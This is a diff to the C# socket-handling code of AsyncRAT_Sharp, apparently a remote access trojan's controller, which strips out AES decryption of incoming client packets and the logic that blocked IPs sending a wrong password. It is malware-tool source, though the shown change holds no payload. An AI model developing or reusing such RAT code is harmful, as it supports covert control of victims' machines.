@@ -8,10 +8,11 @@ using System.Drawing;
 using System.Diagnostics;
 using System.Threading;
 using AsyncRAT_Sharp.MessagePack;
+using System.Text;
 
 namespace AsyncRAT_Sharp.Sockets
 {
-   public class Clients
+    public class Clients
     {
         public Socket ClientSocket { get; set; }
         public ListViewItem LV { get; set; }
@@ -67,17 +68,7 @@ namespace AsyncRAT_Sharp.Sockets
                             BytesRecevied += Recevied;
                             if (ClientMS.Length == ClientBuffersize)
                             {
-                                try
-                                {
-                                    ThreadPool.QueueUserWorkItem(Packet.Read, new object[] { Settings.AES.Decrypt(ClientMS.ToArray()), this });
-                                }
-                                catch (CryptographicException)
-                                {
-                                   new HandleLogs().Addmsg($"Client {ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} tried to connect with wrong password, IP blocked", Color.Red);
-                                    Settings.Blocked.Add(ClientSocket.RemoteEndPoint.ToString().Split(':')[0]);
-                                    Disconnected();
-                                    return;
-                                }
+                                ThreadPool.QueueUserWorkItem(Packet.Read, new object[] {ClientMS.ToArray(), this });
                                 ClientBuffer = new byte[4];
                                 ClientMS.Dispose();
                                 ClientMS = new MemoryStream();
